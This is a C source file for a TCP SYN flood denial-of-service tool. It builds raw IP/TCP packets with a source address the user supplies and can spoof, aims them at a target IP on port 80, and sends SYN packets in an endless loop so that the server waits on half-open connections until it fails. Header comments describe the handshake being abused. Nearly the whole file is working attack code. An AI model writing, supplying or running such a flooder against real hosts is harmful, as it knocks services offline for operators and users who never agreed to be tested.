/*************************************************************************
 * Syn Flood
 *
 * 1. Client  --   sync --> Server
 * 2. Client <-- ack-syn -- Server
 * 3. Client  --   ack  --> Server ( server waits for ack )
 *
 * If the third step does not perform in any way or performs incorrectly, 
 * server always waits ack packet from client and downs after time.
 *
 *************************************************************************/

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h> 
#include <netinet/ip.h>
#include <arpa/inet.h>

#define PARAMETERS 1
 
// pseudo header structure
// this structure is used to send spoofy packet to server.
struct pseudo_header {
	unsigned int source_address;
  unsigned int dest_address;
  unsigned char placeholder;
  unsigned char protocol;
  unsigned short tcp_length;
     
  struct tcphdr tcp;
};
 
// function that calculates check sum of data array
unsigned short csum( unsigned short *ptr, int nbytes ) {
  register long sum = 0;
  unsigned short oddbyte;
  register short answer;
  
	while( nbytes > 1 ) {
      sum += *ptr++;
      nbytes -= 2;
  }
  
	if( nbytes == 1 ) {
		oddbyte = 0;
    *( ( u_char* ) &oddbyte ) = *( u_char* ) ptr;
    sum += oddbyte;
  }
 
  sum = ( sum >> 16 ) + ( sum & 0xffff );
  sum = sum + ( sum >> 16 );
  answer = ( short ) ~sum;
     
  return answer;
}

// main function 
int main( int argc, char **argv ) {
	// PF : stand for protocol family that refers to any protocol. it is actually same AF_INET. AF_INET might be used instead
	// of it. PF_INET is preferred to create socket with socket(), whereas AF_INET is used for sockaddr_in structure.
	// SOCK_RAW : socket type. ( raw type is for data transfer without any protocol-specific transport layer formatting. )
	// IPPROTO_TCP : protocol type( client-server communication is TCP, thus TCP protocol is used. )
	int s = socket( PF_INET, SOCK_RAW, IPPROTO_TCP );
  // Datagram to represent the packet
  char datagram[ 4096 ] , source_ip[ 32 ];
  // IP header starts from datagram address
  struct iphdr *iph = ( struct iphdr * ) datagram;
  // TCP header starts from datagram address + size of struct IP
  struct tcphdr *tcph = ( struct tcphdr * ) ( datagram + sizeof( struct ip ) );
  struct sockaddr_in sin;
  struct pseudo_header psh;
     
	// attacker IP address
#if PARAMETERS
  strcpy( source_ip , argv[ 1 ] );
#else
  strcpy( source_ip , "192.168.1.2" );
#endif

	// address family
  sin.sin_family = AF_INET;
	// socket ( server-side ) port number ( 80 is HTTP port )
  sin.sin_port = htons( 80 );
	// server IP address 
#if PARAMETERS
  sin.sin_addr.s_addr = inet_addr( argv[ 2 ] );    
#else
  sin.sin_addr.s_addr = inet_addr( "1.2.3.4" );    
#endif

	// fill 0 (zero) datagram array
  memset( datagram, 0, 4096 ); 
     
  // fill in the IP Header
	// header length
  iph->ihl = 5;
	// protocol version (IPv4)
  iph->version = 4;
	// 
  iph->tos = 0;
  // total length
	iph->tot_len = sizeof( struct ip ) + sizeof( struct tcphdr );
	// packet id
  iph->id = htons( 54321 );
	// fragment off
  iph->frag_off = 0;
	// time to live ( or maximum hops )
  iph->ttl = 255;
	// protocol is TCP
  iph->protocol = IPPROTO_TCP;
	// packet checksum ( set to 0 before calculating checksum )
  iph->check = 0;
	// source IP address ( spoof the source ip address? )
  iph->saddr = inet_addr ( source_ip );
	// destination address
  iph->daddr = sin.sin_addr.s_addr;    
  // calculate check sum with new data
	iph->check = csum( ( unsigned short * ) datagram, iph->tot_len >> 1 );
     
	// source port number ( from client )
  tcph->source = htons( 1234 );
	// destination port number ( to server )
  tcph->dest = htons( 80 );
	// 32-bit sequence number
  tcph->seq = 0;
  // 32-bit acknowledge sequence number
	tcph->ack_seq = 0;
	// words on tcp header ( first and only tcp segment )
  tcph->doff = 5;
	// terminates the connection
  tcph->fin = 0;
  // SYN flag
	tcph->syn = 1;
  // RST flag
	tcph->rst=0;
	// push data immediately
  tcph->psh = 0;
  // acknowledge
	tcph->ack = 0;
	// urgent flag
  tcph->urg = 0;
	// packet windows size might be 155? ( maximum allowed window size )
	tcph->window = htons( 5840 ); 
	// if you set a checksum to zero, your kernel's IP stack
  // should fill in the correct checksum during transmission
  tcph->check = 0;
	// 16-bit urgen data( if only urgent flag is set )
  tcph->urg_ptr = 0;

  psh.source_address = inet_addr( source_ip );
  psh.dest_address = sin.sin_addr.s_addr;
  psh.placeholder = 0;
  psh.protocol = IPPROTO_TCP;
  psh.tcp_length = htons( 20 );
     
  memcpy( &psh.tcp , tcph , sizeof ( struct tcphdr ) );
     
  tcph->check = csum( ( unsigned short* ) &psh , sizeof( struct pseudo_header ) );
     
  int one = 1;
  const int *val = &one;

  //IP_HDRINCL to tell the kernel that headers are included in the packet
  if( setsockopt( s, IPPROTO_IP, IP_HDRINCL, val, sizeof( one ) ) < 0 ) {
		printf( "Error setting IP_HDRINCL. Error number : %d . Error message : %s \n",  errno, strerror( errno ) );
    exit( EXIT_FAILURE );
  }
     
  while( 1 ) {
		// the buffer containing headers and data */
		// total length of our datagram
		// routing flags, normally always 0
		// socket addr, just like in
    if( sendto( s, datagram, iph->tot_len, 0, ( struct sockaddr * ) &sin, sizeof( sin ) ) < 0 )
			printf( "error\n" );
    else
			printf( "packet is sent\n" );
  }
     
	return 0;
}
